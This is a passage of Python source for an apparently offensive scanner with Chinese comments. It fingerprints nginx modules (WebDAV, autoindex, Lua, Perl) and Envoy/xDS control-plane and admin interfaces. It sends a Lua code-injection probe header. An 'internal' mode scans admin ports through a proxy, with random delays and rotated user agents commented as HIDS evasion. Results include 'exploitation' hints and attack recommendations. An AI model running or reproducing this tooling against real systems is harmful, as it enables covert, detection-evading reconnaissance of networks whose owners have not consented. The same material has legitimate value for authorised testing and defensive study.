                    chunk = await asyncio.wait_for(reader.read(4096), timeout=2.0)
                    if not chunk:
                        break
                    response += chunk
                
                response_str = response.decode('utf-8', errors='ignore')
                
                # 检查Allow头
                for line in response_str.split('\r\n'):
                    if line.startswith('Allow:') or line.startswith('DAV:'):
                        allowed = line.split(':', 1)[1].strip()
                        for method in webdav_methods:
                            if method in allowed:
                                webdav_detected = True
                                if method not in supported_methods:
                                    supported_methods.append(method)
                
                writer.close()
                await writer.wait_closed()
                
            except Exception as e:
                pass
            
            # 2. PROPFIND请求测试
            if webdav_detected or True:  # 总是测试，即使OPTIONS没有返回WebDAV方法
                tests_performed += 1
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.target_host, self.target_port),
                        timeout=self.timeout
                    )
                    
                    propfind_body = '''<?xml version="1.0" encoding="utf-8"?>
<propfind xmlns="DAV:">
  <prop>
    <getcontentlength/>
    <getlastmodified/>
    <resourcetype/>
  </prop>
</propfind>'''
                    
                    request = f"PROPFIND {path} HTTP/1.1\r\n"
                    request += f"Host: {self.target_host}\r\n"
                    request += "User-Agent: Mozilla/5.0\r\n"
                    request += f"Content-Length: {len(propfind_body)}\r\n"
                    request += "Content-Type: application/xml\r\n"
                    request += "Depth: 1\r\n"
                    request += "Connection: close\r\n\r\n"
                    request += propfind_body
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    response = b""
                    while True:
                        chunk = await asyncio.wait_for(reader.read(4096), timeout=2.0)
                        if not chunk:
                            break
                        response += chunk
                    
                    response_str = response.decode('utf-8', errors='ignore')
                    
                    # 检查是否返回207 Multi-Status
                    if "207 Multi-Status" in response_str or "<D:multistatus" in response_str:
                        webdav_detected = True
                        print(f"[+] WebDAV detected at {path}")
                        
                        # 检查是否可写
                        if self._check_webdav_writable(path):
                            writable_paths.append(path)
                    
                    writer.close()
                    await writer.wait_closed()
                    
                except Exception as e:
                    pass
        
        if webdav_detected:
            severity = "HIGH" if writable_paths else "MEDIUM"
            return {
                'detected': True,
                'module': 'ngx_http_dav_module',
                'severity': severity,
                'tests_performed': tests_performed,
                'supported_methods': supported_methods,
                'writable_paths': writable_paths,
                'evidence': f"WebDAV methods supported: {', '.join(supported_methods)}",
                'impact': 'WebDAV can be used for file upload/modification' if writable_paths else 'WebDAV enabled but appears read-only',
                'exploitation': f"Use cadaver or curl with PROPFIND/PUT methods"
            }
        else:
            return {
                'detected': False,
                'tests_performed': tests_performed
            }
    
    def _check_webdav_writable(self, path: str) -> bool:
        """同步检查WebDAV路径是否可写"""
        # 这里简化处理，实际应该尝试PUT请求
        return path in ['/webdav/', '/upload/', '/files/']
    
    async def _detect_autoindex_module(self) -> Dict:
        """检测AutoIndex模块（目录列表）"""
        tests_performed = 0
        autoindex_paths = []
        
        # 测试常见路径
        test_paths = [
            '/', '/files/', '/download/', '/uploads/', '/public/',
            '/static/', '/media/', '/backup/', '/logs/', '/tmp/'
        ]
        
        for path in test_paths:
            tests_performed += 1
            
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, self.target_port),
                    timeout=self.timeout
                )
                
                request = f"GET {path} HTTP/1.1\r\n"
                request += f"Host: {self.target_host}\r\n"
                request += "User-Agent: Mozilla/5.0\r\n"
                request += "Connection: close\r\n\r\n"
                
                writer.write(request.encode())
                await writer.drain()
                
                response = b""
                while True:
                    chunk = await asyncio.wait_for(reader.read(4096), timeout=2.0)
                    if not chunk:
                        break
                    response += chunk
                
                response_str = response.decode('utf-8', errors='ignore')
                
                # 检查AutoIndex特征
                autoindex_indicators = [
                    '<title>Index of',
                    '<h1>Index of',
                    'Parent Directory',
                    '>[DIR]<',
                    'nginx autoindex',
                    '<pre><a href="',
                    'Last modified</a>',
                    'Size</a></pre><hr>'
                ]
                
                if any(indicator in response_str for indicator in autoindex_indicators):
                    autoindex_paths.append({
                        'path': path,
                        'files_exposed': response_str.count('<a href=') - 1  # 减去parent directory
                    })
                    print(f"[+] Directory listing found at {path}")
                
                writer.close()
                await writer.wait_closed()
                
            except Exception as e:
                pass
        
        if autoindex_paths:
            total_files = sum(p['files_exposed'] for p in autoindex_paths)
            return {
                'detected': True,
                'module': 'ngx_http_autoindex_module',
                'severity': 'MEDIUM',
                'tests_performed': tests_performed,
                'autoindex_paths': autoindex_paths,
                'evidence': f"Directory listing enabled on {len(autoindex_paths)} paths",
                'impact': f'Information disclosure: {total_files} files/directories exposed',
                'exploitation': f"Browse to exposed directories for file enumeration"
            }
        else:
            return {
                'detected': False,
                'tests_performed': tests_performed
            }
    
    async def _detect_lua_module(self) -> Dict:
        """检测Lua模块"""
        tests_performed = 0
        lua_detected = False
        lua_endpoints = []
        
        # Lua模块常见端点和错误
        lua_test_vectors = [
            {"path": "/lua", "error": "lua"},
            {"path": "/test.lua", "error": "lua"},
            {"path": "/?test=1", "header": "X-Lua-Test: 1"},
            {"path": "/", "header": "X-Powered-By: Lua"},
        ]
        
        for vector in lua_test_vectors:
            tests_performed += 1
            
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, self.target_port),
                    timeout=self.timeout
                )
                
                # 发送可能触发Lua错误的请求
                request = f"GET {vector['path']}{{{{ HTTP/1.1\r\n"  # 故意的语法错误
                request += f"Host: {self.target_host}\r\n"
                request += "User-Agent: Mozilla/5.0\r\n"
                request += "X-Test: ${print(1)}\r\n"  # Lua代码注入尝试
                request += "Connection: close\r\n\r\n"
                
                writer.write(request.encode())
                await writer.drain()
                
                response = b""
                while True:
                    chunk = await asyncio.wait_for(reader.read(4096), timeout=2.0)
                    if not chunk:
                        break
                    response += chunk
                
                response_str = response.decode('utf-8', errors='ignore')
                
                # 检查Lua相关错误或头部
                lua_indicators = [
                    'lua', 'ngx_lua', 'openresty',
                    'content_by_lua', 'rewrite_by_lua',
                    'access_by_lua', 'header_filter_by_lua',
                    'body_filter_by_lua', 'log_by_lua'
                ]
                
                if any(indicator in response_str.lower() for indicator in lua_indicators):
                    lua_detected = True
                    lua_endpoints.append(vector['path'])
                    print(f"[+] Lua module detected via {vector['path']}")
                
                writer.close()
                await writer.wait_closed()
                
            except Exception as e:
                pass
        
        if lua_detected:
            return {
                'detected': True,
                'module': 'ngx_http_lua_module',
                'severity': 'HIGH',
                'tests_performed': tests_performed,
                'lua_endpoints': lua_endpoints,
                'evidence': f"Lua module detected on {len(lua_endpoints)} endpoints",
                'impact': 'Lua code execution possible - high risk for code injection',
                'exploitation': 'Potential for Lua code injection attacks'
            }
        else:
            return {
                'detected': False,
                'tests_performed': tests_performed
            }
    
    async def _detect_perl_module(self) -> Dict:
        """检测Perl模块"""
        tests_performed = 0
        perl_detected = False
        
        # Perl模块检测
        perl_test_paths = ['/perl-status', '/perl', '/cgi-bin/']
        
        for path in perl_test_paths:
            tests_performed += 1
            
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, self.target_port),
                    timeout=self.timeout
                )
                
                request = f"GET {path} HTTP/1.1\r\n"
                request += f"Host: {self.target_host}\r\n"
                request += "User-Agent: Mozilla/5.0\r\n"
                request += "Connection: close\r\n\r\n"
                
                writer.write(request.encode())
                await writer.drain()
                
                response = b""
                while True:
                    chunk = await asyncio.wait_for(reader.read(4096), timeout=2.0)
                    if not chunk:
                        break
                    response += chunk
                
                response_str = response.decode('utf-8', errors='ignore')
                
                # 检查Perl相关指标
                if any(indicator in response_str for indicator in [
                    'Perl', 'perl', 'mod_perl', 'Embedded Perl',
                    'perl-status', 'Perl/v'
                ]):
                    perl_detected = True
                    print(f"[+] Perl module detected at {path}")
                
                writer.close()
                await writer.wait_closed()
                
            except Exception as e:
                pass
        
        if perl_detected:
            return {
                'detected': True,
                'module': 'ngx_http_perl_module',
                'severity': 'HIGH',
                'tests_performed': tests_performed,
                'evidence': "Perl module detected",
                'impact': 'Perl code execution enabled - risk of code injection',
                'exploitation': 'Potential for Perl code injection'
            }
        else:
            return {
                'detected': False,
                'tests_performed': tests_performed
            }
    
    async def _detect_third_party_modules(self) -> Dict:
        """检测第三方模块"""
        tests_performed = 0
        detected_modules = []
        
        # 通过Server头和特殊响应检测第三方模块
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target_host, self.target_port),
                timeout=self.timeout
            )
            
            request = f"GET / HTTP/1.1\r\n"
            request += f"Host: {self.target_host}\r\n"
            request += "User-Agent: Mozilla/5.0\r\n"
            request += "Connection: close\r\n\r\n"
            
            writer.write(request.encode())
            await writer.drain()
            
            response = b""
            while True:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=2.0)
                if not chunk:
                    break
                response += chunk
            
            response_str = response.decode('utf-8', errors='ignore')
            tests_performed += 1
            
            # 检查各种第三方模块指标
            third_party_indicators = {
                'pagespeed': {'module': 'ngx_pagespeed', 'severity': 'LOW'},
                'naxsi': {'module': 'naxsi (WAF)', 'severity': 'INFO'},
                'modsecurity': {'module': 'ModSecurity', 'severity': 'INFO'},
                'openresty': {'module': 'OpenResty', 'severity': 'MEDIUM'},
                'tengine': {'module': 'Tengine', 'severity': 'LOW'},
                'nchan': {'module': 'nchan', 'severity': 'MEDIUM'},
                'push-stream': {'module': 'nginx-push-stream', 'severity': 'MEDIUM'},
            }
            
            for indicator, info in third_party_indicators.items():
                if indicator in response_str.lower():
                    detected_modules.append({
                        'module': info['module'],
                        'severity': info['severity'],
                        'evidence': f"{indicator} detected in response"
                    })
            
            # 检查特殊头部
            special_headers = {
                'X-Page-Speed': 'ngx_pagespeed',
                'X-Nginx-Cache': 'nginx cache module',
                'X-Accel': 'X-Accel module',
            }
            
            for header, module in special_headers.items():
                if header in response_str:
                    detected_modules.append({
                        'module': module,
                        'severity': 'LOW',
                        'evidence': f"{header} header present"
                    })
            
            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            pass
        
        return {
            'tests_performed': tests_performed,
            'modules_found': len(detected_modules),
            'modules': detected_modules
        }
    
    async def detect_cloud_native_architecture(
        self, 
        scan_mode: str = 'external', 
        proxy_info: Optional[Dict] = None,
        progressive: bool = True
    ) -> Dict:
        """
        检测云原生网关架构特征 - 双模情景感知探测
        
        Args:
            scan_mode: 'external' (默认) 或 'internal' 
            proxy_info: {'host': '127.0.0.1', 'port': 9999} 代理信息，内网模式必需
            progressive: 是否使用渐进式探测（推荐）
        """
        
        print(f"[*] Detecting cloud-native gateway architecture...")
        print(f"[*] Scan mode: {scan_mode.upper()}")
        if scan_mode == 'internal' and proxy_info:
            print(f"[*] Using proxy: {proxy_info['host']}:{proxy_info['port']}")
        
        architecture_indicators = {
            'scan_context': {
                'mode': scan_mode,
                'proxy_enabled': proxy_info is not None,
                'progressive_scan': progressive
            }
        }
        
        try:
            # 1. xDS配置下发检测 - 双模感知
            print(f"[*] Phase 1: xDS protocol detection ({scan_mode} mode)")
            xds_detection = await self._detect_xds_config_flow(scan_mode, proxy_info, progressive)
            architecture_indicators['xds_protocol'] = xds_detection
            
            # 2. 控制面/数据面分离检测 - 双模感知
            print(f"[*] Phase 2: Control/Data plane separation analysis")
            separation_detection = await self._probe_control_plane_separation(scan_mode, proxy_info)
            architecture_indicators['control_data_separation'] = separation_detection
            
            # 3. 配置热更新vs reload检测
            print(f"[*] Phase 3: Configuration reload mechanism analysis")
            reload_detection = await self._test_config_reload_mechanism(scan_mode, proxy_info)
            architecture_indicators['config_reload_mechanism'] = reload_detection
            
            # 4. Envoy特征检测 - 双模感知
            print(f"[*] Phase 4: Envoy characteristics detection")
            envoy_detection = await self._detect_envoy_characteristics(scan_mode, proxy_info)
            architecture_indicators['envoy_features'] = envoy_detection
            
            # 5. 内网模式专属：深度管理接口探测
            if scan_mode == 'internal':
                print(f"[*] Phase 5: Deep admin interface analysis (INTERNAL ONLY)")
                admin_detection = await self._deep_admin_interface_scan(proxy_info)
                architecture_indicators['admin_interfaces'] = admin_detection
            
            # 综合分析架构类型 - 考虑扫描模式
            architecture_analysis = self._analyze_architecture_type(architecture_indicators, scan_mode)
            
            return {
                'architecture_type': architecture_analysis['type'],
                'confidence': architecture_analysis['confidence'],
                'scan_mode': scan_mode,
                'indicators': architecture_indicators,
                'security_implications': architecture_analysis['security_implications'],
                'attack_recommendations': architecture_analysis['attack_recommendations'],
                'internal_exposure': architecture_analysis.get('internal_exposure', 'Unknown')
            }
            
        except Exception as e:
            return {
                'architecture_type': 'ERROR',
                'confidence': 0,
                'scan_mode': scan_mode,
                'indicators': architecture_indicators,
                'error': f"Architecture detection failed: {e}",
                'security_implications': [],
                'attack_recommendations': []
            }
    
    async def _detect_xds_config_flow(self, scan_mode: str, proxy_info: Optional[Dict], progressive: bool = True) -> Dict:
        """检测xDS协议配置下发机制 - 双模感知版本"""
        try:
            # 根据扫描模式选择端口策略
            if scan_mode == 'internal':
                if progressive:
                    # 渐进式内网扫描：分层探测
                    ports_to_scan = []
                    ports_to_scan.extend(PROBE_LAYERS['admin_interfaces'])  # 先扫管理接口
                    ports_to_scan.extend(PROBE_LAYERS['deep_control'])     # 再扫深度控制面
                    print(f"[*] INTERNAL mode: Progressive scanning {len(ports_to_scan)} admin/control ports")
                else:
                    ports_to_scan = INTERNAL_PROBE_PORTS
                    print(f"[*] INTERNAL mode: Full scanning {len(ports_to_scan)} ports")
            else:
                # 外部模式：只扫描可能暴露在公网的端口
                ports_to_scan = EXTERNAL_PROBE_PORTS
                print(f"[*] EXTERNAL mode: Conservative scanning {len(ports_to_scan)} public ports")
            
            detected_endpoints = []
            scan_summary = {
                'total_ports': len(ports_to_scan),
                'successful_probes': 0,
                'failed_probes': 0,
                'timeout_probes': 0
            }
            
            for port in ports_to_scan:
                try:
                    # HIDS规避：内网模式随机延迟
                    if scan_mode == 'internal':
                        delay = random.uniform(STEALTH_CONFIG['min_delay'], STEALTH_CONFIG['max_delay'])
                        await asyncio.sleep(delay)
                    
                    print(f"[*] Testing xDS endpoint: {self.target_host}:{port} ({'via proxy' if proxy_info else 'direct'})")
                    
                    # 尝试连接admin接口
                    admin_response = await self._test_envoy_admin_interface(port, proxy_info, scan_mode)
                    if admin_response['accessible']:
                        detected_endpoints.append({
                            'port': port,
                            'type': 'admin_interface', 
                            'response': admin_response,
                            'via_proxy': proxy_info is not None
                        })
                        scan_summary['successful_probes'] += 1
                    
                    # 尝试gRPC连接
                    grpc_response = await self._test_grpc_connection(port, proxy_info, scan_mode)
                    if grpc_response['accessible']:
                        detected_endpoints.append({
                            'port': port,
                            'type': 'grpc_endpoint',
                            'response': grpc_response,
                            'via_proxy': proxy_info is not None
                        })
                        scan_summary['successful_probes'] += 1
                        
                except asyncio.TimeoutError:
                    scan_summary['timeout_probes'] += 1
                    continue
                except Exception as e:
                    scan_summary['failed_probes'] += 1
                    continue
            
            # 双模差异分析
            detection_confidence = self._calculate_xds_confidence(detected_endpoints, scan_mode)
            
            return {
                'xds_detected': len(detected_endpoints) > 0,
                'endpoints': detected_endpoints,
                'scan_mode': scan_mode,
                'scan_summary': scan_summary,
                'detection_confidence': detection_confidence,
                'evidence': f"Found {len(detected_endpoints)} potential xDS endpoints in {scan_mode} mode",
                'implications': self._generate_xds_implications(detected_endpoints, scan_mode),
                'internal_exposure': self._assess_internal_exposure(detected_endpoints, scan_mode)
            }
            
        except Exception as e:
            return {
                'xds_detected': False,
                'endpoints': [],
                'scan_mode': scan_mode,
                'evidence': f"xDS detection failed: {e}",
                'implications': "Unable to determine xDS usage",
                'internal_exposure': 'Unknown'
            }
    
    async def _test_envoy_admin_interface(self, port: int, proxy_info: Optional[Dict] = None, scan_mode: str = 'external') -> Dict:
        """测试Envoy admin接口 - 双模代理支持版本"""
        try:
            # 根据模式选择连接方式
            if proxy_info and scan_mode == 'internal':
                # 内网模式通过代理连接
                reader, writer = await self._create_proxy_connection(port, proxy_info)
            else:
                # 外网模式直接连接
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, port),
                    timeout=3.0
                )
            
            # 选择合适的User-Agent（内网模式使用伪装）
            if scan_mode == 'internal':
                user_agent = random.choice(STEALTH_CONFIG['user_agents'])
            else:
                user_agent = "EnvoyProbe/1.0"
            
            # 尝试访问多个Envoy admin端点
            admin_endpoints = ['/stats', '/clusters', '/config_dump', '/server_info']
            best_response = None
            envoy_score = 0
            
            for endpoint in admin_endpoints:
                try:
                    admin_request = (
                        f"GET {endpoint} HTTP/1.1\r\n"
                        f"Host: {self.target_host}:{port}\r\n"
                        f"User-Agent: {user_agent}\r\n"
                        f"Connection: close\r\n\r\n"
                    )
                    
                    writer.write(admin_request.encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.read(2048), timeout=3.0)
                    response_text = response.decode('utf-8', errors='ignore')
                    
                    # 检查Envoy特征
                    envoy_indicators = [
                        'envoy.', 'cluster.', 'listener.', 'server.', 'runtime.',
                        'upstream_', 'downstream_', 'http.inbound', 'http.outbound'
                    ]
                    
                    found_features = [indicator for indicator in envoy_indicators if indicator in response_text.lower()]
                    current_score = len(found_features)
                    
                    if current_score > envoy_score:
                        envoy_score = current_score
                        best_response = {
                            'endpoint': endpoint,
                            'response_text': response_text,
                            'envoy_features': found_features
                        }
                    
                    # 如果找到强特征，提前结束
                    if current_score >= 5:
                        break
                        
                except asyncio.TimeoutError:
                    continue
                except Exception:
                    continue
            
            writer.close()
            await writer.wait_closed()
            
            if best_response:
                # 额外的Envoy版本和配置信息提取
                version_info = self._extract_envoy_version(best_response['response_text'])
                admin_analysis = self._analyze_admin_exposure(best_response['response_text'], scan_mode)
                
                return {
                    'accessible': True,
                    'envoy_features': best_response['envoy_features'],
                    'response_preview': best_response['response_text'][:300],
                    'likely_envoy': envoy_score >= 2,
                    'envoy_confidence': min(envoy_score / 8.0, 1.0),  # 标准化到0-1
                    'best_endpoint': best_response['endpoint'],
                    'version_info': version_info,
                    'admin_exposure_risk': admin_analysis,
                    'scan_mode': scan_mode
                }
            else:
                return {
                    'accessible': False,
                    'envoy_features': [],
                    'response_preview': '',
                    'likely_envoy': False,
                    'envoy_confidence': 0.0,
                    'scan_mode': scan_mode
                }
            
        except Exception as e:
            return {
                'accessible': False,
                'envoy_features': [],
                'response_preview': '',
                'likely_envoy': False,
                'envoy_confidence': 0.0,
                'scan_mode': scan_mode,
                'error': str(e)
            }
    
    async def _test_grpc_connection(self, port: int, proxy_info: Optional[Dict] = None, scan_mode: str = 'external') -> Dict:
        """测试gRPC连接（简化版本） - 双模支持"""
        try:
            # 根据模式选择连接方式
            if proxy_info and scan_mode == 'internal':
                reader, writer = await self._create_proxy_connection(port, proxy_info)
            else:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, port),
                    timeout=3.0
                )
            
            # 发送HTTP/2连接前奏（gRPC over HTTP/2）
            grpc_preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
            writer.write(grpc_preface)
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(256), timeout=2.0)
            
            writer.close()
            await writer.wait_closed()
            
            # 检查HTTP/2响应和gRPC特征
            http2_response = len(response) > 9 and response[:9] != grpc_preface[:9]
            grpc_likely = len(response) > 0 and (
                b'grpc' in response.lower() or 
                (http2_response and b'HTTP/2' not in response)
            )
            
            return {
                'accessible': len(response) > 0,
                'http2_response': http2_response,
                'response_length': len(response),
                'likely_grpc': grpc_likely,
                'scan_mode': scan_mode,
                'via_proxy': proxy_info is not None,
                'grpc_confidence': 0.8 if grpc_likely else 0.2
            }
            
        except Exception as e:
            return {
                'accessible': False,
                'http2_response': False,
                'response_length': 0,
                'likely_grpc': False,
                'scan_mode': scan_mode,
                'via_proxy': proxy_info is not None,
                'grpc_confidence': 0.0,
                'error': str(e)
            }
    
    async def _probe_control_plane_separation(self, scan_mode: str, proxy_info: Optional[Dict] = None) -> Dict:
        """探测控制面和数据面是否分离 - 双模支持"""
        try:
            # 根据扫描模式选择端口策略
            if scan_mode == 'internal':
                control_plane_ports = [8080, 9090, 15000, 15001, 15010, 15014]  # 扩展内网控制面端口
                data_plane_ports = [80, 443, 8000, 8443, 8888, 9999]  # 扩展数据面端口
            else:
                control_plane_ports = [8080, 9090]  # 外网只测试可能暴露的端口
                data_plane_ports = [80, 443, 8000, 8443]
            
            control_responses = []
            data_responses = []
            
            # 测试控制面端口
            for port in control_plane_ports:
                try:
                    if scan_mode == 'internal':
                        await asyncio.sleep(random.uniform(0.2, 0.8))  # HIDS规避
                    
                    response = await self._probe_service_port(port, proxy_info, scan_mode)
                    if response['accessible']:
                        control_responses.append(response)
                except:
                    continue
            
            # 测试数据面端口
            for port in data_plane_ports:
                try:
                    if scan_mode == 'internal':
                        await asyncio.sleep(random.uniform(0.2, 0.8))
                    
                    response = await self._probe_service_port(port, proxy_info, scan_mode)
                    if response['accessible']:
                        data_responses.append(response)
                except:
                    continue
            
            # 双模差异分析
            separation_indicators = {
                'different_server_headers': self._analyze_server_header_differences(control_responses, data_responses),
                'port_specialization': len(control_responses) > 0 and len(data_responses) > 0,
                'control_plane_accessible': len(control_responses) > 0,
                'data_plane_accessible': len(data_responses) > 0,
                'scan_mode_impact': self._analyze_scan_mode_impact(control_responses, data_responses, scan_mode)
            }
            
            # 基于模式的分离程度判断
            if scan_mode == 'external':
                if len(control_responses) > 0:
                    separation_level = "EXTERNAL_CONTROL_EXPOSED"  # 严重安全问题
                elif len(data_responses) > 0:
                    separation_level = "TRADITIONAL_OR_WELL_SECURED"
                else:
                    separation_level = "NO_ACCESS"
            else:  # internal mode
                if len(control_responses) > 0 and len(data_responses) > 0:
                    separation_level = "SEPARATED_ARCHITECTURE"
                elif len(data_responses) > 0 and len(control_responses) == 0:
                    separation_level = "TRADITIONAL_ARCHITECTURE"
                else:
                    separation_level = "INCONCLUSIVE"
            
            return {
                'separation_level': separation_level,
                'control_plane_ports': [r['port'] for r in control_responses],
                'data_plane_ports': [r['port'] for r in data_responses],
                'indicators': separation_indicators,
                'scan_mode': scan_mode,
                'evidence': f"{scan_mode.upper()}: Control plane: {len(control_responses)} ports, Data plane: {len(data_responses)} ports",
                'security_impact': self._assess_separation_security_impact(separation_level, scan_mode)
            }
            
        except Exception as e:
            return {
                'separation_level': 'ERROR',
                'control_plane_ports': [],
                'data_plane_ports': [],
                'indicators': {},
                'scan_mode': scan_mode,
                'evidence': f"Control/data plane detection failed: {e}"
            }
    
    async def _probe_service_port(self, port: int, proxy_info: Optional[Dict] = None, scan_mode: str = 'external') -> Dict:
        """探测服务端口特征 - 双模支持"""
        try:
            # 选择连接方式
            if proxy_info and scan_mode == 'internal':
                if port in [443, 8443]:
                    # HTTPS通过代理比较复杂，先简化处理
                    reader, writer = await self._create_proxy_connection(port, proxy_info)
                else:
                    reader, writer = await self._create_proxy_connection(port, proxy_info)
            else:
                if port in [443, 8443]:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.target_host, port, ssl=ctx),
                        timeout=3.0
                    )
                else:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.target_host, port),
                        timeout=3.0
                    )
            
            # 选择User-Agent
            if scan_mode == 'internal':
                user_agent = random.choice(STEALTH_CONFIG['user_agents'])
            else:
                user_agent = "ArchitectureProbe/1.0"
            
            request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {self.target_host}:{port}\r\n"
                f"User-Agent: {user_agent}\r\n"
                f"Connection: close\r\n\r\n"
            )
            
            writer.write(request.encode())
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(1024), timeout=3.0)
            response_text = response.decode('utf-8', errors='ignore')
            
            writer.close()
            await writer.wait_closed()
            
            # 提取服务器信息和额外的架构指纹
            server_header = ""
            status_code = ""
            architecture_hints = []
            
            if 'HTTP/' in response_text:
                lines = response_text.split('\r\n')
                status_code = lines[0].split(' ')[1] if len(lines[0].split(' ')) > 1 else ''
                
                for line in lines[1:]:
                    if line.lower().startswith('server:'):
                        server_header = line.split(':', 1)[1].strip()
                    # 检查架构相关头部
                    elif any(header in line.lower() for header in ['x-envoy', 'x-istio', 'x-gateway', 'x-proxy']):
                        architecture_hints.append(line.strip())
            
            return {
                'accessible': True,
                'port': port,
                'server_header': server_header,
                'status_code': status_code,
                'response_preview': response_text[:200],
                'architecture_hints': architecture_hints,
                'scan_mode': scan_mode,
                'via_proxy': proxy_info is not None
            }
            
        except Exception as e:
            return {
                'accessible': False,
                'port': port,
                'server_header': '',
                'status_code': '',
                'response_preview': '',
                'architecture_hints': [],
                'scan_mode': scan_mode,
                'via_proxy': proxy_info is not None if proxy_info else False,
                'error': str(e)
            }
    
    async def _test_config_reload_mechanism(self, scan_mode: str, proxy_info: Optional[Dict] = None) -> Dict:
        """测试配置重载机制（热更新vs进程重启） - 双模支持"""
        try:
            # 通过连续请求检测配置更新模式
            baseline_connections = []
            
            # 建立基线连接特征
            for i in range(3):
                if scan_mode == 'internal':
                    await asyncio.sleep(random.uniform(0.5, 1.5))  # HIDS规避
                
                conn_info = await self._analyze_connection_characteristics(proxy_info, scan_mode)
                if conn_info:
                    baseline_connections.append(conn_info)
                await asyncio.sleep(1)
            
            if len(baseline_connections) < 2:
                return {
                    'reload_mechanism': 'UNKNOWN',
                    'evidence': 'Insufficient baseline data for reload mechanism detection',
                    'characteristics': [],
                    'scan_mode': scan_mode
                }
            
            # 分析连接稳定性和进程特征
            process_stability = self._analyze_process_stability(baseline_connections)
            
            # 双模特定分析
            mode_specific_analysis = self._analyze_reload_by_mode(baseline_connections, scan_mode)
            
            return {
                'reload_mechanism': process_stability['mechanism'],
                'evidence': process_stability['evidence'],
                'characteristics': baseline_connections,
                'implications': process_stability['implications'],
                'scan_mode': scan_mode,
                'mode_specific_insights': mode_specific_analysis
            }
            
        except Exception as e:
            return {
                'reload_mechanism': 'ERROR',
                'evidence': f"Reload mechanism test failed: {e}",
                'characteristics': [],
                'scan_mode': scan_mode
            }
    
    async def _analyze_connection_characteristics(self, proxy_info: Optional[Dict] = None, scan_mode: str = 'external') -> Optional[Dict]:
        """分析连接特征 - 双模支持"""
        try:
            start_time = time.perf_counter()
            
            # 根据模式选择连接方式
            if proxy_info and scan_mode == 'internal':
                # 通过代理的连接分析比较复杂，简化处理
                try:
                    reader, writer = await self._create_proxy_connection(self.target_port, proxy_info)
                    
                    request = f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\nConnection: close\r\n\r\n"
                    writer.write(request.encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.read(512), timeout=self.timeout)
                    
                    writer.close()
                    await writer.wait_closed()
                    
                    connection_time = (time.perf_counter() - start_time) * 1000
                    
                    return {
                        'connection_time': connection_time,
                        'local_port': 0,  # 代理模式下无法获取真实本地端口
                        'timestamp': time.time(),
                        'response_size': len(response),
                        'server_response_time': connection_time,
                        'via_proxy': True,
                        'scan_mode': scan_mode
                    }
                    
                except Exception:
                    return None
            else:
                # 直连模式
                sock = socket.create_connection((self.target_host, self.target_port), self.timeout)
                
                # 获取连接信息
                local_addr = sock.getsockname()
                remote_addr = sock.getpeername()
                
                # 发送HTTP请求
                if self.target_port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False  
                    ctx.verify_mode = ssl.CERT_NONE
                    ssock = ctx.wrap_socket(sock, server_hostname=self.target_host)
                    
                    request = f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\nConnection: close\r\n\r\n"
                    ssock.send(request.encode())
                    response = ssock.recv(512)
                    ssock.close()
                else:
                    request = f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\nConnection: close\r\n\r\n"
                    sock.send(request.encode())
                    response = sock.recv(512)
                    sock.close()
                
                connection_time = (time.perf_counter() - start_time) * 1000
                
                return {
                    'connection_time': connection_time,
                    'local_port': local_addr[1],
                    'timestamp': time.time(),
                    'response_size': len(response),
                    'server_response_time': connection_time,
                    'via_proxy': False,
                    'scan_mode': scan_mode
                }
            
        except Exception as e:
            return None
    
    def _analyze_reload_by_mode(self, connections: List[Dict], scan_mode: str) -> Dict:
        """根据扫描模式分析重载机制"""
        mode_analysis = {
            'insights': [],
            'confidence_adjustment': 1.0,
            'mode_specific_indicators': []
        }
        
        try:
            if scan_mode == 'external':
                mode_analysis['insights'].extend([
                    "External scan provides limited visibility into reload mechanisms",
                    "Connection stability analysis may miss internal process details"
                ])
                mode_analysis['confidence_adjustment'] = 0.7
                
                # 检查连接时间的一致性
                times = [conn['connection_time'] for conn in connections]
                if len(times) >= 2:
                    time_variance = max(times) - min(times)
                    if time_variance < 50:  # 小于50ms变化
                        mode_analysis['mode_specific_indicators'].append("Consistent external response times suggest stable process")
                    else:
                        mode_analysis['mode_specific_indicators'].append("Variable external response times may indicate process reloads")
            
            else:  # internal mode
                mode_analysis['insights'].extend([
                    "Internal scan provides better visibility into service architecture",
                    "Proxy-based analysis may add latency but reveals internal behavior"
                ])
                mode_analysis['confidence_adjustment'] = 1.3
                
                # 检查代理相关的性能指标
                proxy_connections = [conn for conn in connections if conn.get('via_proxy', False)]
                if proxy_connections:
                    mode_analysis['mode_specific_indicators'].append("Internal proxy analysis provides architectural insights")
                
                # 内网模式下可以检查更多细节
                response_sizes = [conn['response_size'] for conn in connections]
                if len(set(response_sizes)) == 1:
                    mode_analysis['mode_specific_indicators'].append("Consistent internal response sizes suggest stable configuration")
        
        except Exception:
            mode_analysis['insights'].append("Mode-specific analysis failed")
        
        return mode_analysis
    
    def _analyze_process_stability(self, connections: List[Dict]) -> Dict:
        """分析进程稳定性特征"""
        if len(connections) < 2:
            return {
                'mechanism': 'UNKNOWN',
                'evidence': 'Insufficient data',
                'implications': 'Cannot determine reload mechanism'
            }
        
        # 分析连接时间的稳定性
        connection_times = [conn['connection_time'] for conn in connections]
        time_variance = max(connection_times) - min(connection_times)
